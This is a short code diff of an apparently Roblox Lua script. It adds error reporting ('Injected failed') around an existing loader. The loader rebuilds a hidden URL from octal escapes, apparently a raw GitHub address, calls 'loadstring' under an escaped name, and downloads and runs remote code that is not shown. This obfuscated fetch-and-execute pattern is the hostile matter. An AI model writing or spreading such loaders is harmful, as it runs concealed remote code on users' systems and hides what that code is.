@@ -27,9 +27,12 @@ local _0xPisit_Base = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\1
 local _0xMethod = getfenv()["\108\111\97\100\115\116\114\105\110\103"]
 
 task.spawn(function()
-    pcall(function()
+    local success, err = pcall(function()
         _0xMethod(game:HttpGet(_0xPisit_Base, true))()
     end)
+    if not success then
+        warn("Injected failed: " .. tostring(err))
+    end
 end)
 -- ##################################################
 
